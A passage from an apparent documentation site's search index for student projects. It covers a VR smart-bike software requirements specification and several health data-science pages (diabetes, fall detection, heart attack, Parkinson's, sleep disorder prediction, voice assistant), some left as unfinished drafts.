project is to exercise and not to play games focused on the city scene as the only scene ready and working currently in the VR project.  Next trimester, the company intends to move missions to new scenes such as the terrain scene or work on missions that are required in scenes other than the city scene such as ‘Escape The Flood’ mission. Leftover missions in the Planner board, left at ongoing, could be updated once new terrains are made for more suitable places. However, thanks to the latest overhaul in the Unity project as nice as it is to have a loading screen and spawning points, the missions can no longer access the UI and print out any statuses or objectives which should be analyzed and fixed immediately before contuining onto other missions.  ","version":"Next","tagName":"h2"},{"title":"6. Overall Description​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#6-overall-description","content":" ","version":"Next","tagName":"h2"},{"title":"6.1. User Needs​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#61-user-needs","content":" The following users we need to cater for the Smart Bike project would be VR enthusiasts with concerns for physical fitness and desire more motivation to become fit even though they do not like going out to exercise and prefer to stay at home.  Cycling enthusiasts do not always have time for long bike rides due to work responsibilities so they would want to cycle at home while collecting health data and exercise while hopping off when needed, ideally with a timed settable workout where user can set the amount of time they wish to ride.  Medical students might be interested in the bike project as users who want to keep a record of their own workout data to have a wholistic record of themselves when adding it to their health/medical records.  Game developers might be interested in the VR part of the smart bike project through branching out into more interesting experiences concerning games and gamified experiences that the smart bike provides through its mission and may contribute something more life changing to end users than just a recreational game. Developers would like to educate, train, motivate and encourage improvement of life through their skillset.  For the smart bike, users who wear glasses and get motion sickness would like to be able to experience the wonders of the project without falling sick so a headset off mode would be ideal especially as they would prefer to be immersed as possible with sound effects and background music / ambiance and interactions as examples.  Users would like to stay log in for the project instead of re-login manually every time the mobile app version of the project is reopened. For non-technical users, they want to be able to plug and play the bike without having to configure anything or setup the Wifi.  ","version":"Next","tagName":"h3"},{"title":"6.2. Assumptions / Dependencies​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#62-assumptions--dependencies","content":" Development and design require the following applications:  Windows / Mac / Linux PCUnity LTS v2022.3.22 (for VR application)Blender 4.2 / Autodesk 3ds Max / Autodesk Maya (for 3D modelling)Visual Studio / VSCode / JetBrains Rider / MonoDevelop  To play the game, the following requirements must be met:  Windows PC and/or Meta Quest 2/3 headsetWahoo KICKR CoreRaspberry Pi device with MQTT system installed  A completed build will be created at the end of each trimester of work through the Unity project:  Build an Android APK, named SmartBike-VR-YEAR-T#-Meta-Quest.apkBuild a Windows build, zip the file and name is SmartBike-VR-YEAR-T#-Windows.zip  ","version":"Next","tagName":"h3"},{"title":"6.3. UI/UX considerations​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#63-uiux-considerations","content":" 6.3.1. User Interface Design Guidelines for Mobile​  6.3.1.1 UI Clarity and Simplicity​  The UI should be clean, simple, and easy to navigate. Functional elements need to be visually distinct, ensuring that users can complete tasks intuitively without confusion. Labels, icons, and navigation elements should all be self-explanatory and unambiguous, promoting a seamless user experience.  Simple, minimalistic design that prioritizes usability over aesthetic complexity.Clear labeling and visual hierarchy to direct user attention to key actions.Consistent use of design elements like buttons and menus across all screens.  6.3.1.2 Platform-Specific Design Adherence​  The UI should respect the design guidelines of the respective platforms. For iOS, this means adhering to the Human Interface Guidelines with emphasis on smooth transitions and intuitive gestures. For Android, Material Design principles should be employed to ensure consistency and ease of use across devices.  iOS: Smooth, intuitive transitions with uniform typography.Android: Use Material Design components such as FABs, cards, and consistent padding.  6.3.1.3 Functionality Over Aesthetics​  The primary focus should be on functionality rather than aesthetic appeal. Each UI element must contribute to improving the user experience by helping users accomplish their tasks effectively. Avoid unnecessary decorations that might hinder usability.  Functionality is prioritized in design decisions, ensuring users can accomplish tasks efficiently.Tooltips and feedback mechanisms help guide users through complex workflows.  6.3.1.4 Consistency Across Platforms​  Consistency is key to creating a smooth, reliable user experience. While the app should conform to platform-specific design patterns, there should be a consistent look and feel across iOS and Android platforms. This includes colors, fonts, and iconography.  Maintain consistency in navigation, color schemes, and visual elements across platforms.Ensure responsive design to support a variety of screen sizes.  6.3.1.5 Accessibility​  Not a must have but would be nice to consider accessibility features while creating designs. This also will also help in future during automation tool integration as accessibility lables are used by most tools. The UI must be accessible to users of all abilities, including those with disabilities. Features like screen reader support, voice control, and sufficient color contrast are essential for making the app usable by everyone.  Enable support for screen readers and voice commands.Use high-contrast colors and legible fonts for readability.  6.3.1.6 Privacy and Safety in UI​  The app must ensure that users feel safe and that their privacy is respected. The design should include elements that make security and privacy settings easily accessible and understandable. Sensitive information should be handled securely, with features like data encryption and clear indicators of what personal data is being used.  Provide clear privacy settings with straightforward options for users to manage their data.Ensure that any permissions requested are transparent, with explanations for why the data is needed.Display alerts or notifications when personal data is being accessed or shared.  6.3.1.7 User Feedback and Error Handling​  The UI should provide users with clear feedback when they interact with the app. This includes error messages, confirmation dialogs, and loading indicators. Error messages should be informative and guide users towards resolving issues.  Provide clear, actionable error messages.Use loading indicators and progress bars to show users when actions are in progress.  6.3.2. User Interface Design Guidelines for Unity​  6.3.2.1. Immersive Interaction Design​  Natural Input Methods  Utilize VR-specific input methods, such as motion controllers and gaze-based interactions. Design UI elements that respond intuitively to hand gestures, pointing, and controller inputs to enhance immersion.  Haptic Feedback  Incorporate haptic feedback for interactive elements to provide physical sensations, reinforcing user actions and enhancing engagement. Use vibrations or tactile responses to confirm selections or interactions.  6.3.2.2. Spatial UI Layout​  3D Spatial Arrangement3D  Position UI elements in 3D space rather than on a flat plane. Use floating panels or contextual menus that the user can reach easily without breaking immersion. Ensure that UI is always within the user's field of view.  Depth and Scaling  Adjust the size and depth of UI elements according to their importance. Make frequently used elements larger and within easy reach, while less critical elements can be smaller or placed farther away.  6.3.2.3. Visual Clarity and Readability​  High Contrast Text  Use high-contrast colors between text and backgrounds to improve readability in various lighting conditions. Ensure that font sizes are large enough to be easily readable from a distance.  Simple and Bold Fonts  Opt for clear, bold typography that is legible in 3D space. Avoid overly stylized fonts that may hinder readability, especially in fast-paced environments.  6.3.2.4. Consistent Visual Language​  Unified Design Elements  Maintain a consistent visual style throughout the UI, including colors, shapes, and iconography. This helps users quickly understand interactions and navigate the interface.  Feedback and States  Provide visual feedback for different states (hover, selected, disabled) through color changes, animations, or outlines. This informs users about the current state of UI elements.  6.3.2.5. User-Centric Navigation​  Intuitive Navigation Patterns  Design navigation to feel intuitive and natural. Use gaze-based selections or raycasting to allow users to easily select and interact with UI elements without complicated gestures.  Guided Tutorials  Implement onboarding tutorials that guide users through the interface and controls. Use visual cues and prompts to help users learn interactions without overwhelming them.  6.3.2.6. Contextual UI​  Dynamic UI Elements  Create context-sensitive UI that adapts based on user actions or environmental changes. For example, show inventory items when a user reaches for their backpack or display relevant information when looking at an object.  Minimize Clutter  Keep the UI minimal and relevant. Avoid overwhelming users with too much information at once; prioritize essential functions and hide less important elements until needed.  6.3.3. User Experience Guidelines for Blender Navigation​  6.3.3.1. Consistent Navigation Controls​  Maintain consistency with navigation controls across different modes (Object Mode, Edit Mode, Sculpt Mode) so users don’t have to relearn movements or shortcuts. Know how to navigate through Blender’s 3D viewport, outliner, Properties panel and understand the different workplaces (Modelling, Sculpting, UV Editing, etc.)  Optimal Viewport Shading: For a better visualization of objects, inform users about different viewport shading modes (Wireframe, Solid, Material Preview, Rendered) and how each is used for specific tasks.Performance Considerations: Users should know how to toggle off unnecessary layers, objects, or heavy textures when performance slows down, especially in complex scenes.Intuitive Camera Controls: Ensure that camera angles and positions are easy to adjust. Teaching users about hotkeys like &quot;Shift + Middle Mouse Button&quot; for panning and &quot;Scroll Wheel&quot; for zooming can significantly improve navigation in the 3D viewport.Custom Layouts: Blender allows custom workspace layouts for different stages of the project (e.g., modeling, texturing, animation). UI/UX contributors should create or suggest layouts that make navigation and tool access easier depending on the task at hand.Orthographic vs. Perspective Views: Guiding users to switch between orthographic and perspective views (&quot;NumPad 5&quot; key) helps with precision when modeling or aligning objects. Default setups should make this accessible.  6.3.3.2. Snapping and Precision Tools​  Snapping Options: Snapping tools (&quot;Shift + Tab&quot; to toggle snapping) are crucial for precise alignment, especially when working with grids or when multiple objects need to align perfectly.Transform Constraints: Users should be encouraged to use axis constraints (press &quot;X&quot;, &quot;Y&quot;, or &quot;Z&quot; after a transformation command like grab, scale, or rotate) for more precise movement along one axis.Measurement Tools: Teaching users how to access the ruler tool (&quot;N&quot; key for the side panel to toggle) or to enable edge lengths for more accurate modeling is helpful for UI/UX clarity.  6.3.3.3. Shortcut Hints​  Familiarity with shortcut hints for key actions in pop up menus and on hover tooltips will promote efficient workflow  Hotkey Familiarity: Ensure that users are familiar with common Blender shortcuts like &quot;G&quot; for Grab, &quot;R&quot; for Rotate, and &quot;S&quot; for Scale. Well-documented hotkeys save time and improve workflow.Custom Key Mapping: If a user prefers different shortcuts or workflows, Blender allows custom key maps. Ensure there’s documentation on how to modify these settings for a more personalized user experience.  6.3.3.4. Undo System​  Ensure a robust undo/redo system is in place for all object and mesh modifications. Users should have back up folders, so they are able to navigate their modeling history without losing progress.  6.3.3.5. Efficient Use of the Outliner​  Outliner Navigation: The outliner is a vital tool for tracking all objects in the scene. Educate users on grouping objects and managing visibility via the outliner, making it easier to organize large scenes.Colour Coding and Layer Management: Encourage using Blender's color tagging feature for collections or objects, allowing users to visually organize their projects more efficiently.  6.3.3.6. Organized Naming Conventions and Hierarchies​  Objects: All objects in the scene should be given clear and descriptive names (e.g., &quot;Table_Leg&quot; instead of &quot;Cube.001&quot;). This improves both the user experience and collaboration, especially on larger projects.Materials: Proper naming of materials (e.g., &quot;Wood_Texture&quot; instead of &quot;Material.001&quot;) helps users easily identify and apply the correct textures.  6.3.3.7. Folders and Collections​  Organizing objects into Collections (Blender’s way of grouping objects) and naming them appropriately ensures that the scene is easy to navigate. For example, a collection named &quot;Furniture&quot; could group all furniture objects, making it easier for users to hide, show, or edit entire groups of assets quickly.  Consistency: Consistent naming schemes across the entire project help users quickly understand how assets are structured, which is key for efficient workflows.  ","version":"Next","tagName":"h3"},{"title":"7. System Features and Requirements​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#7-system-features-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"7.1. Functional Requirements​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#71-functional-requirements","content":" For the SmartBike Project, students focusing on the VR Unity project must abide by the guideline while creating and pushing the code into GitHub:  Before uploading anything into the project, make sure that the latest project is pulled from the GitHub before adding, committing and finally pushing anything into the GitHub to be contributed.As long as there is progress, run through it with the leader and project tutor to make sure it is fine to push the work into the project as it can be better to push what has already been done immediately than finishing it and pushing a bulk into the project that might be too much for a push.When creating mission code, create an empty object and place the code inside. For the mission to activate, place the empty object in Objectives&gt;Missions (seen in CityScene) where there is MissionActivator script to add missions in a list as empty objects.Do not add mission code on bike even for testing purposes, as it will interfere with other missions and mission code needs to be tested within mission activator to know it will work there.  For the Smartbike mobile app project, students must abide to following guidelines:  Make sure to always update your IDEs (android studio, Xcode, etc.) to the latest version before working.Make sure the fork your work from main repository and synchronize it with main mobile repository before working on any new tasks.Make sure to format code changes correctly. If your IDE (Likely VS Code) has its own formatting that is altering unchanged file, make sure to only commit files that you worked on.If making changes to the API, make sure that the changes do not break anything. If the changes must be made, update the readme, and inform team members of breaking changes.The VR workout is integrated to MQTT protocol to send data from bike. To run it properly, the server must send necessary data with correct connection information. This is not readily available so you might need to adjust the connection information yourself to test during development (Hive MQ is a common tool we use). Most of the necessary test codes are already present in the application.The user should be able to login, signup, edit profile and add workout stats in the application.  ","version":"Next","tagName":"h3"},{"title":"7.2. External Interface Requirements​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#72-external-interface-requirements","content":" The spectator or non-VR mode uses a Windows PC with a full screen application that uses a 16:9 resolution. This is based on the standard Full High-Definition (FHD) resolution of 1920x1080. The screen needs to be connected to the PC on display port 1, or the primary display and will allow the player to experience the game on a TV or computer screen, such as a laptop device, or when in simultaneous viewing the player in a VR headset allowing spectators to see the world that the player is exploring.  ","version":"Next","tagName":"h3"},{"title":"7.3. System Features​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#73-system-features","content":" The virtual cycling game offers a wide range of system features designed to provide a comprehensive and engaging user experience:  Real-time Multiplayer: Powered by Photon Fusion, the game ensures smooth, low-latency multiplayer interactions, allowing players to join virtual events, races, or group rides.Synchronized Views: Players in VR experience immersive first-person perspectives, while external monitors display alternative views, cycling stats, and race progress, making it suitable for spectators.Performance Tracking: The game tracks detailed metrics like time, distance, speed, calories burned, and player positions, providing real-time feedback and rankings.Cooperative Challenges: Players can participate in team-based activities like endurance rides or obstacle courses, promoting teamwork and social interaction.Cross-platform Compatibility: The game is designed to run on most VR headsets, ensuring broad accessibility, and includes a non-VR mode for those who prefer traditional gaming without wearing a headset.Account Syncing: Player scores, progress, and preferences are tied to user accounts, allowing seamless transitions between devices and preserving personal settings.Virtual Tourism: Players can explore virtual landscapes and real-world routes, offering an immersive experience beyond typical fitness apps.Competitive and Casual Modes: The system caters to both competitive gaming through races and leaderboards, as well as casual riders seeking leisure or structured fitness sessions.Rehabilitation and Therapy Support: The game can be used as a tool for physical rehabilitation, providing controlled cycling exercises to aid recovery.  These features combine to create a dynamic system that appeals to fitness enthusiasts, social gamers, and anyone looking for a fun and interactive way to exercise.  ","version":"Next","tagName":"h3"},{"title":"8. Non-Functional Requirements​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#8-non-functional-requirements","content":" Visual Aesthetic: The game must adhere to an art style that is 80% realism and 20% cartoon, creating a visually appealing yet approachable experience. All assets and images must reflect this aesthetic balance. For reference, developers and designers should consult the Asset Handbook (URL HERE). This ensures that the look and feel of the game is consistent across all environments, characters, and objects.Documentation and Educational Materials: Comprehensive &quot;how-to-build&quot; documentation must be provided for the development process, aimed at future developers, particularly students. This documentation should include detailed steps, screenshots, and/or video explanations, enabling others to recreate the game from scratch. The materials should be clear, beginner-friendly, and outline the process in a structured manner, allowing learners to build their own custom games. The guides should emphasize the development of similar 2D or 3D games using the provided assets, with instructions designed for users with minimal programming experience.Asset and Documentation Accessibility: All visual assets and reference documents, including the Asset Handbook and development guides, must be easily accessible through the company’s internal documentation system. This ensures that future developers have quick access to necessary resources when expanding or customizing the game.Compatibility and Scalability: The game must be scalable to work on a wide range of VR headsets while maintaining performance. The non-VR version must also ensure compatibility with a variety of screen sizes and input devices, without compromising the core aesthetic or functionality.  ","version":"Next","tagName":"h2"},{"title":"9. Definitions and Acronyms​","type":1,"pageTitle":"Software Requirements Specification","url":"/redback-documentation/docs/project-1/vr/software-requirements#9-definitions-and-acronyms","content":" PR = pull requestQA = Quality AssuranceSRS = Software Requirements Specification2D = Two DimensionalRPi = Raspberry piAPI = Application Programming InterfaceVR = Virtual Reality ","version":"Next","tagName":"h2"},{"title":"Predictive Modelling of Diabetes","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/DiabetesProject","content":"","keywords":"","version":"Next"},{"title":"Data Analytics​","type":1,"pageTitle":"Predictive Modelling of Diabetes","url":"/redback-documentation/docs/project-2/Data Science and Analytics/DiabetesProject#data-analytics","content":" To analyse this data, as well as to train machine learning classification models, a number of python libraries have been incorporated into the project:  Data Analytics / Transformation: PandasNumpy Visualization: MatPlotLibSeaborn Machine Learning: Scikit-LearnTensorflow / KerasKerasTuner  ","version":"Next","tagName":"h2"},{"title":"Dataset 1​","type":1,"pageTitle":"Predictive Modelling of Diabetes","url":"/redback-documentation/docs/project-2/Data Science and Analytics/DiabetesProject#dataset-1","content":" https://www.kaggle.com/datasets/iammustafatz/diabetes-prediction-dataset The original poster is coy3 about the source of the data but it is still one of the most popular datasets across Kaggle.  This Dataset consists of 100001 records which after cleaning, and selction for those aged 55 and over, is reduced to 30995.  The columns are as follows  Name\tDescription\tTypegender\tGender of the patient\tNominal: [Male, Female, Other] age\tAge of the patient\tDiscrete: [Years, 55 ➡ 80] hypertension\tHistory of hypertension\tNominal: [0: false, 1: true] heart_disease\tPatient history of heart disease\tNominal: [0: false, 1: true] smoking_history\tPatients Smoking History\tNominal: ['never', 'current', 'No Info', 'former', 'not current', 'ever'] bmi\tBody-Mass Index: calculated by body-mass / height^2\tContinuous HbA1c_level\tAverage Blood Glucose over the last 3 months\tContinuous: [A1c%] blood_glucose_level\tBlood glucose at time of recording\tDiscrete: [mg/dL] diabetes\tWhether the patient has been diagnosed with diabetes\tNominal: [0: false, 1: true]  ","version":"Next","tagName":"h3"},{"title":"Dataset 2​","type":1,"pageTitle":"Predictive Modelling of Diabetes","url":"/redback-documentation/docs/project-2/Data Science and Analytics/DiabetesProject#dataset-2","content":" https://archive.ics.uci.edu/dataset/529/early+stage+diabetes+risk+prediction+dataset  This dataset is provided in the UC Irvine ML repo and was collected using questionnaires from the patients of the Syhlet Diabetes Hospital in Bangladesh.4  The Dataset contains 17 columns and 520 records  Name\tDescription\tTypeAge\tAge of the patient\tDiscrete: [Years] Gender\tGender of the patient\tNominal: [Male, Female] Polyuria\tExcessive Urine\tNominal: [No, Yes] Polydipsia\tExcessive Thirst\tNominal: [No, Yes] Sudden Weight Loss Nominal: [No, Yes] Weakness Nominal: [No, Yes] Polyphagia\tExtreme Hunger\tNominal: [No, Yes] Genital Thrush Nominal: [No, Yes] Visual Blurring Nominal: [No, Yes] Itching Nominal: [No, Yes] Irritability Nominal: [No, Yes] Delayed Healing Nominal: [No, Yes] Partial Paresis\tMuscular weakness / impairment\tNominal: [No, Yes] Muscle Stiffness Nominal: [No, Yes] Alopecia\tHair Loss\tNominal: [No, Yes] Obesity Nominal: [No, Yes] Class\tPresense of Diabetes\tNominal: [Negative, Positive]  ","version":"Next","tagName":"h3"},{"title":"Approach​","type":1,"pageTitle":"Predictive Modelling of Diabetes","url":"/redback-documentation/docs/project-2/Data Science and Analytics/DiabetesProject#approach","content":" Please discuss your analytics workflow / methodology here  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Claire Van Gils, Lachlan Costigan    Footnotes​ https://www.diabetesaustralia.com.au/about-diabetes/diabetes-in-australia/ ↩ https://www.abs.gov.au/statistics/health/causes-death/provisional-mortality-statistics/jan-may-2024 ↩ https://www.kaggle.com/datasets/iammustafatz/diabetes-prediction-dataset/discussion/406676#2282358 ↩ Islam, M. M. Faniqul et al. “Likelihood Prediction of Diabetes at Early Stage Using Data Mining Techniques.” Computer Vision and Machine Intelligence in Medical Image Analysis (2019): n. pag. ↩ ","version":"Next","tagName":"h2"},{"title":"Fall detection feature for Elderly Care Wearable","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring","content":"","keywords":"","version":"Next"},{"title":"Implementation​","type":1,"pageTitle":"Fall detection feature for Elderly Care Wearable","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring#implementation","content":" At present, we are able to detect a fall using the devices, accelerometer and gyroscoper. We're presently working towards Activity Monitoring and Automated alerts to relevant parties  ","version":"Next","tagName":"h2"},{"title":"Assumptions​","type":1,"pageTitle":"Fall detection feature for Elderly Care Wearable","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring#assumptions","content":" The fall detection model can be generalised for the elderly.The model can generalize to detect falls in elderly individuals outside specified height ranges.Readings taken with the sensor positioned around the wrist are assumed to be comparable to those taken around the chest.  ","version":"Next","tagName":"h3"},{"title":"Future Considerations​","type":1,"pageTitle":"Fall detection feature for Elderly Care Wearable","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring#future-considerations","content":" Explore advanced AI algorithms to enhance fall detection accuracy.Implement proactive health monitoring features to detect early signs of potential health issues beyond falls.Incorporate intuitive user interfaces based on ongoing user feedback to optimize usability.Acquire a larger dataset, retrain the model, and conducting hyperparameter tuning to attain optimal performance in fall detection.Collaborate with the Software and App Development and Backend Development teams to incorporate the feature to the wearable device.  ","version":"Next","tagName":"h3"},{"title":"How to run the project on Local Machine​","type":1,"pageTitle":"Fall detection feature for Elderly Care Wearable","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring#how-to-run-the-project-on-local-machine","content":" To run the project on a local machine, follow these steps:  Clone the repository from GitHubNavigate to the Fall detection directoryInstall the required dependencies using pip install -r docs/requirements.txtTo run the project, run the fall_detection.ipynb fileTo retrain the model with a different dataset, add the dataset into the /data directory. The trained models are stored in the /models directory  ","version":"Next","tagName":"h3"},{"title":"Implementation details​","type":1,"pageTitle":"Fall detection feature for Elderly Care Wearable","url":"/redback-documentation/docs/project-2/Data Science and Analytics/FallDetection_ActivityMonitoring#implementation-details","content":" This feature makes use of the following Python Libraries:  Data Analytics / Transformation: PandasNumpy Visualization: MatPlotLib Machine Learning: Scikit-LearnTensorflow / Keras  Models were trained using captured sensor data from the 1st wearable prototype  Please fill in with technical details of implementation  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan ","version":"Next","tagName":"h3"},{"title":"Heart Attack Prediction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/HeartAttackPrediction","content":"","keywords":"","version":"Next"},{"title":"Data Analytics​","type":1,"pageTitle":"Heart Attack Prediction","url":"/redback-documentation/docs/project-2/Data Science and Analytics/HeartAttackPrediction#data-analytics","content":" To analyse this data, as well as to train machine learning classification models, a number of python libraries have been incorporated into the project:  Data Analytics / Transformation: PandasNumpy Visualization: MatPlotLibSeaborn Machine Learning: Scikit-LearnTensorflow / KerasLightGBMXGBoostimblearn  ","version":"Next","tagName":"h2"},{"title":"Dataset 1​","type":1,"pageTitle":"Heart Attack Prediction","url":"/redback-documentation/docs/project-2/Data Science and Analytics/HeartAttackPrediction#dataset-1","content":" The dataset used in heart_attack_prediction.ipynb is the Heart Attack Risk Prediction Dataset synthesized by Sourav Banerjee with the assistance of ChatGPT1  Name\tDescription\tTypePatient ID Nominal Age Discrete: [years] Sex Nominal: [Male, Female] Cholestrol\tTotal Cholestrol measured\tDiscrete: [mg/dL] Blood Pressure\t2 Values showing the pressure over the heart beating and the heart relaxing\tDiscrete: [Systotic/Diastolic (mm Hg)] Heart Rate Discrete: [beats per minute] Diabetes\tPresence of diabetes in the patient\tNominal: [1: Yes, 0: No] Family History Nominal: [1: Yes, 0: No] Smoking Nominal: [1: Yes, 0: No] Obesity Nominal: [1: Yes, 0: No] Alcohol Consumption Nominal: [1: Yes, 0: No] Hours of Exercise per Week Continuous Diet Ordinal: [ Healthy, Average, Unhealth] Previous Heart Problems Nominal: [1: Yes, 0: No] Medication Use Nominal: [1: Yes, 0: No] Stress Level\tSelf-reported level of stress\tOrdinal: [1 ➡ 10] Sedentry Hours\tPer Day\tContinuous Income\tAnnual income\tContinuous BMI\tBody-Mass Index: calculated by body-mass / height^2\tContinuous Triglycerides Continuous: [mg/dL] Physical Activity Days Per Week Continous Sleep Hours Per Day Continous Heart Attack Risk Continuous: [0➡1]  ","version":"Next","tagName":"h3"},{"title":"Dataset 2​","type":1,"pageTitle":"Heart Attack Prediction","url":"/redback-documentation/docs/project-2/Data Science and Analytics/HeartAttackPrediction#dataset-2","content":" Please cite the sources of this dataset. I tried my damndest but couldnt find it  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan  The dataset used in the Heart_Disease_Prediction.ipynb notebook, looking at the discussion it seems to be synthetic (i.e generated by ChatGPT):    Footnotes​ https://www.kaggle.com/datasets/iamsouravbanerjee/heart-attack-prediction-dataset/data ↩ ","version":"Next","tagName":"h3"},{"title":"Parkinson's Disease Prediction Model","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/ParkinsonsPrediction","content":"","keywords":"","version":"Next"},{"title":"Data Analysis​","type":1,"pageTitle":"Parkinson's Disease Prediction Model","url":"/redback-documentation/docs/project-2/Data Science and Analytics/ParkinsonsPrediction#data-analysis","content":" To analyse this data, as well as to train machine learning classification models, a number of python libraries have been incorporated into the project:  Data Analytics / Transformation: PandasNumpy Visualization: MatPlotLibSeaborn Machine Learning: Scikit-Learn  ","version":"Next","tagName":"h2"},{"title":"Dataset​","type":1,"pageTitle":"Parkinson's Disease Prediction Model","url":"/redback-documentation/docs/project-2/Data Science and Analytics/ParkinsonsPrediction#dataset","content":" The dataset used at this stage is the Oxford Parkinson's Disease Detection Dataset2. This dataset consists of 195 voice recordings of 31 people, 23 of which have been diagnosed with Parkinson's Diseas  The data has the following features:  Name\tDescription\ttypeName\tAn ID denoting a patient\tnominal MDVP:Fo\tAverage Vocal fundamental frequency\tContinuous: [Hz] MDVP:Fhi\tMax. Vocal fundamental frequency\tContinuous: [Hz] MDVP:Flo\tMin Vocal fundamental frequency\tContinuous:[Hz] MDVP:Jitter\tmeasure of variation in fundamental frequency\tContinuous:[%] MDVP:Jitter\tmeasure of variation in fundamental frequency\tContinuous:[Absolute Value] MDVP:RAP\tmeasure of variation in fundamental frequency\tContinuous MDVP:PPQ\tmeasure of variation in fundamental frequency\tContinuous Jitter:DDP\tmeasure of variation in fundamental frequency\tContinuous MDVP:Shimmer\tmeasure of variation in amplitude\tContinuous MDVP:Shimmer\tmeasure of variation in amplitude\tContinuous: [dB] Shimmer:APQ3\tmeasure of variation in amplitude\tContinuous Shimmer:APQ5\tmeasure of variation in amplitude\tContinuous MDVP:APQ\tmeasure of variation in amplitude\tContinuous Shimmer:DDA\tmeasure of variation in amplitude\tContinuous NHR\tmeasure of ratio of noise to tonal components in the voice\tContinous HNR\tmeasure of ratio of noise to tonal components in the voice\tContinuous status\tHealth status of the subject\tNominal: [1: Parkinson's. 0: No Parkinson's] RPDE\tNonlinear Dynamical Complexity Measure\tContinuous DFA\tSignal fractal scaling exponent\tContinuous spread1\tNonlinear measure of fundamental frequency variation\tContinuous spread2\tNonlinear measure of fundamental frequency variation\tContinous D2\tNonlinear measure of fundamental frequency variation\tContinuous PPE Continuous  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan    Footnotes​ https://www.mayoclinic.org/diseases-conditions/parkinsons-disease/symptoms-causes/syc-20376055 ↩ Little, M. (2007). Parkinsons [Dataset]. UCI Machine Learning Repository. https://doi.org/10.24432/C59C74. Accessible from http://archive.ics.uci.edu/dataset/174/parkinsons ↩ ","version":"Next","tagName":"h3"},{"title":"Sleep Disorder Prediction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/SleepDisorder","content":"","keywords":"","version":"Next"},{"title":"Data Analytics​","type":1,"pageTitle":"Sleep Disorder Prediction","url":"/redback-documentation/docs/project-2/Data Science and Analytics/SleepDisorder#data-analytics","content":" Please fill this out with a walkthrough of your analytics and ML model training workflow  At present the sleep predictor has an accuracy of 73.5% on unseen test data  To analyse this data, as well as to train machine learning classification models, a number of python libraries have been incorporated into the project:  Data Analytics / Transformation: PandasNumpy Visualization: MatPlotLibSeaborn Machine Learning: Scikit-LearnTensorflow / Keras  ","version":"Next","tagName":"h2"},{"title":"Dataset​","type":1,"pageTitle":"Sleep Disorder Prediction","url":"/redback-documentation/docs/project-2/Data Science and Analytics/SleepDisorder#dataset","content":" Talk about Data Preprocessing  The dataset used for initial training of the model is ICHI14-BORAZIO12, collected from 42 subjects aged 28 - 86, wearing high frequency 3d inertial data loggers over 409 hours.  I dont have time to make a dataset summary table for this.  info Document Creation: 5 September 2024. Last Edited: 5 September 2024. Authors: Lachlan Costigan    Footnotes​ Borazio, Marko &amp; Berlin, Eugen &amp; Kücükyildiz, Nagihan &amp; Scholl, Philipp &amp; Van Laerhoven, Kristof. (2014). Towards Benchmarked Sleep Detection with Inertial Wrist-worn Sensing Units. Proceedings - 2014 IEEE International Conference on Healthcare Informatics, ICHI 2014. 10.1109/ICHI.2014.24. ↩ Source for the dataset itself ↩ ","version":"Next","tagName":"h3"},{"title":"Voice Assistant feature for Elderly Care Wearable.","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-2/Data Science and Analytics/VoiceAssisstant","content":"","keywords":"","version":"Next"},{"title":"Implementation​","type":1,"pageTitle":"Voice Assistant feature for Elderly Care Wearable.","url":"/redback-documentation/docs/project-2/Data Science and Analytics/VoiceAssisstant#implementation","content":" At present the voice assistant is able to repond to queries relating to local time, weather and basic assistance to reported symptoms. Features in active development include mental health counselling / guidance, making calls, dictating messages and conducting health assessments.  The project uses the following external sources as part of its design:  pygame: Python UI Libraryspeech_recognition: Library for parsing spoken word and transcribing to textNeuralIntents: Library created by python Youtuber / Blogger Florian Dedov aka NeuralNine for rudimentry Voice Assistants.BeautifulSoup: The most popular library for parsing HTML and XML.LocationTagger: A Python library implementing location extraction from NLPrequests: A library for generating HTTP/1.1 requests  ","version":"Next","tagName":"h2"},{"title":"Structure​","type":1,"pageTitle":"Voice Assistant feature for Elderly Care Wearable.","url":"/redback-documentation/docs/project-2/Data Science and Analytics/VoiceAssisstant#structure","content":" Voice Assistant Runtime​  main.py Spins up the UI module pygame_win and speech_to_text modules and executes them in parallel, Handles overall program execution and termination.  pygame_win.py Module implementing UI classes and functions from pygame.  speech_to_text.py Wrapper for the speech_recognition library functions that records user spoken queuries and attempts to use Google Speech recognition to convert it into text.  generate_response.py Defines the logic for responding to user queries across a number of categories. Creates an assisstant object based on the intents.json and supplied pre-trained voice assistant model.  text_to_speech.py Calls the get_response function from the generate_response.py module, Verbally outputs the generated response.  Training​  train_model.pyTrains the model based on the neuralintents.assistants module and the intents.json file. Fits the model with epoch=50. Outputs model to ./models/ as:  [model_name].keras - A zip file containing the config of the model, .h5 state with the weights and biases and a JSON metadata 